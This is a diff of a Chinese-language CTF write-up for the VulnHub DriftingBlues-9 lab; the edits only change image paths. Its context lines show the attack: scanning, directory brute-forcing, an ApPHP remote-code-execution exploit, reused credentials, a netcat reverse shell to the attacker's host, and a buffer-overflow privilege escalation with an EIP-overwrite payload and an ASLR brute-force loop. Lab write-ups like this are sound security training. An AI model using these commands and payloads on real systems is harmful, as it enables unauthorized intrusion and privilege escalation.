@@ -10,7 +10,7 @@
 
 使用`arp-scan -l`或`netdiscover -r 192.168.1.1/24`
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\1.jpg)
+![](./pic-9/1.jpg)
 
 
 
@@ -18,13 +18,13 @@
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\2.jpg)
+![](./pic-9/2.jpg)
 
 ## 网站探测
 
 访问80端口，这或许就是CMS
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\3.jpg)
+![](./pic-9/3.jpg)
 
 使用`whatweb`探测
 
@@ -32,7 +32,7 @@
 whatweb http://192.168.1.66
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\4.jpg)
+![](./pic-9/4.jpg)
 
 使用`gobuster、ffuf、dirsearch、dirb、dirbuster`等工具进行目录爆破
 
@@ -40,11 +40,11 @@ whatweb http://192.168.1.66
 gobuster dir -u http://192.168.1.66 -w /usr/share/wordlists/dirb/big.txt -x zip,php,txt,md,html,jpg -d -b 404,403
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\5.jpg)
+![](./pic-9/5.jpg)
 
 访问`README.txt`，确定CMS及版本
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\6.jpg)
+![](./pic-9/6.jpg)
 
 # 漏洞寻找
 
@@ -54,7 +54,7 @@ gobuster dir -u http://192.168.1.66 -w /usr/share/wordlists/dirb/big.txt -x zip,
 searchsploit apphp
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\7.jpg)
+![](./pic-9/7.jpg)
 
 有一个远程代码执行的`py`脚本，尝试使用该脚本进行测试，注意，这里需要的是`python2`的环境
 
@@ -78,17 +78,17 @@ Usage: python 33070.py http://target/blog/index.php
 
 用户名`clapton`和密码`yaraklitepe`
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\8.jpg)
+![](./pic-9/8.jpg)
 
 测试命令是否能被执行，发现确实可以
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\9.jpg)
+![](./pic-9/9.jpg)
 
 # 靶机内信息收集
 
 查看靶机内的用户
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\10.jpg)
+![](./pic-9/10.jpg)
 
 为了后续方便，还是获取一个终端为好，不过这里只是命令执行，所以需要进行反弹shell。
 
@@ -102,7 +102,7 @@ nc -lvvp 9999
 nc -e /bin/bash 192.168.1.16 9999
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\11.jpg)
+![](./pic-9/11.jpg)
 
 然后使用`python`获取一个终端，注意，这里是`python2`，因为之前使用命令测试安装的版本
 
@@ -116,11 +116,11 @@ compgen -c | grep python  //靶机没有这个命令
 
 既然有用户`clapton`，与前面收集的连接数据库的一样了，测试是否一码多用，成功
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\12.jpg)
+![](./pic-9/12.jpg)
 
 返回其主目录查看，发现一个SUID的文件，剩下的两个，一个`flag`，一个内容说缓冲区溢出是这个方法
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\13.jpg)
+![](./pic-9/13.jpg)
 
 使用`file`知道是可执行文件，但是无法知道其内容，使用`python`开启简易的`http`，然后下载到`kali`中
 
@@ -132,7 +132,7 @@ python -m SimpleHTTPServe 9999
 
 使用`strings`也没发现调用命令等，不过发现一些信息，收集一下
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\14.jpg)
+![](./pic-9/14.jpg)
 
 # 缓冲区溢出提取
 
@@ -149,7 +149,7 @@ cd /proc/sys/kernel
 echo 0 > randomize_va_space
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\15.jpg)
+![](./pic-9/15.jpg)
 
 
 
@@ -161,15 +161,15 @@ echo 0 > randomize_va_space
 
 打开`input`文件，然后把生成的字符写入
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\16.jpg)
+![](./pic-9/16.jpg)
 
 然后进行执行调试，发现最终提示溢出
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\17.jpg)
+![](./pic-9/17.jpg)
 
 可以看到`EIP`和`ESP`都是A，EIP是进行跳转执行指令地址的，ESP是指令寄存处
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\18.jpg)
+![](./pic-9/18.jpg)
 
 那么这时候测试其偏移量为多少，使用`msf`生成无规律的字符
 
@@ -177,13 +177,13 @@ echo 0 > randomize_va_space
 msf-pattern_create -l 600
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\19.jpg)
+![](./pic-9/19.jpg)
 
 然后把这一串字符，复制，与上面一样，在打开文件时，写入
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\20.jpg)
+![](./pic-9/20.jpg)
 
-![21](D:\stu\vulnhub\DriftingBlues靶场\pic-9\21.jpg)
+![21](./pic-9/21.jpg)
 
 再使用`msf`查看这个字符所处的位置
 
@@ -191,7 +191,7 @@ msf-pattern_create -l 600
 msf-pattern_offset -l 600 -q 41376641
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\22.jpg)
+![](./pic-9/22.jpg)
 
 OK，确定偏移量为171，那么从172开始的四个字符就是EIP的地址，也是需要重点关注的，并且再测试确实后面跟着的就是ESP中的内容。
 
@@ -209,7 +209,7 @@ gdb input
 (gdb)x/s $esp
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\23.jpg)
+![](./pic-9/23.jpg)
 
 获取到地址`0xbfae41b0`，这时候就可以进行构造`payload`，因为这里是小端序字节，所以地址需要倒写`\xb0\x41\xae\xbf`
 
@@ -221,7 +221,7 @@ $(python -c 'print("A"*171+"\xb0\x41\xae\xbf"+"\x62\x61\x73\x68\x20\x2d\x63\x20\
 
 再次构造后，把上面的语句进行测试，可以看到确实是小端序吧，并且发现`ESP`地址改变，说明靶机内的`alsr`是开启的，地址就会动态变化
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\24.jpg)
+![](./pic-9/24.jpg)
 
 那就不可能一次就中，说明这里可能需要多次，那么就写一个循环，注意，这里是一行，也就是可以直接输入，如要多行，可能需要用到EOF等
 
@@ -235,7 +235,7 @@ for i in {1..10000}; do (./input $(python -c 'print("A"*171+"\x70\x3f\xf8\xbf"+"
 
 直接在终端运行，等待一会，提取成功
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-9\25.jpg)
+![](./pic-9/25.jpg)
 
 
 
